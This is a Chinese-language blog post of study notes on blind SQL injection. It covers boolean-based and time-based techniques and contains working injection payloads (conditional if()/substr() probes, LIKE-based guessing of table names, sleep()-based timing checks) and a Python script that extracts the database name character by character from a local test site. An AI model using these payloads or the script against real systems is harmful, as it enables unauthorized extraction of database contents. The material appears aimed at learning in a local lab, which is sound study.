---
title: sql盲注笔记
toc: true
recommend: 1
uniqueId: '2021-05-04 15:59:48/sql-injection-blind.html'
mathJax: false
date: 2021-05-04 23:59:48
thumbnail:
tags:
categories:
keywords:
---
> 什么是盲注？在sql注入点输入sql语句不回显任何数据，只返回了网页处理的结果（使用布尔盲注），甚至不返回结果（设置数据库查询时间，时间盲注）
>
> 盲注是非常繁琐的，需要不断的更改url进行判断，可以用BP的intruder模块配合或者编程（直到我发现了sqlmap）

<!-- more -->

## 布尔盲注

进行布尔盲注一定要分清楚报错的条件，比如有的是数据为空、语句报错时报错，有的只是语句报错时才报错。

### 判断流程

`?id=1 and 's'='p'` 如果报错错则可以使用 `and` 爆破

### 爆破方法(payload)

1. `?id=1 and 构造出想要的数据 =/like 猜想的数据`
2. `?id = if(构造出想要的数据 =/like 猜想的数据, 1, (select table_name from information_schema.tables)) `

> tips：`false` 的的输出必须是 1 column，否则语句报错

### 获取数据库名

目前先使用python进行爆破

```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
import sys
import string
import time

session = requests.session()  # 访问该网站的其他页面时使用一样的cookie, 保持会话
url = "http://localhost:10000/?id="
success_flag = ''  # 查询正确页面标志


def database_name():
    time_start = time.time()
    name = ''
    flag = True
    while flag:
        pos = 1
        old_pos = 0 # 判断是否结束
        for asc_str in list(string.ascii_lowercase)+list('_'):
            payload1 = "if(substr(database(),%d,1) = '%s',1,(select table_name from information_schema.tables))" % (
                pos, asc_str)
            #payload2 = "1 and substr(database(),%d,1) = '%s'" % (
            #    pos, asc_str)
            result = requests.get(url+payload1)
            if success_flag in result.text:
                name += asc_str
                old_pos = pos
                pos += 1
                break
        if old_pos+1 != pos:
            flag = False
            time_end = time.time()

            print('Database name       : {}\nNumber of characters: {}\nTime cost           : {}'.format(
                name, pos, time_end-time_start))

    return name

if __name__ == '__main__':
    database_name()
```

从注入点得到当前数据库的表数

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bool-blind.png)

使用BP暴出数据库的名字（一个字母一个字母的暴破）

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bp-sql-blind.png)

爆破该数据库第一张表的名字(也是一个字母一个字母)

```sql
?id=1' and (select table_name 
			from information_schema.tables 
			where table_schema = database() 
			limit 0,1) 
		like 'u%' --+
```

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bp-sql-blind2.png)

## 时间盲注

如果连网页处理结果都不给的话，还可以设置数据库查询时间进行盲注

比如下面这个页面，不管输入什么都显示一个样

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection-blind-time.png)

利用时间注入，当sql语句运行成功时延时2s

```sql
?id=1' and if(
left(database(),1)='x', sleep(2), 0)
--+
```

进BP的intruder模块进行爆破

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection-blind-time2.png)

可以看到响应2s的是开头为s的url，所以数据库的首字母为s

注意：因为没有错误提醒，所以一定要注意在url里sql语法上的问题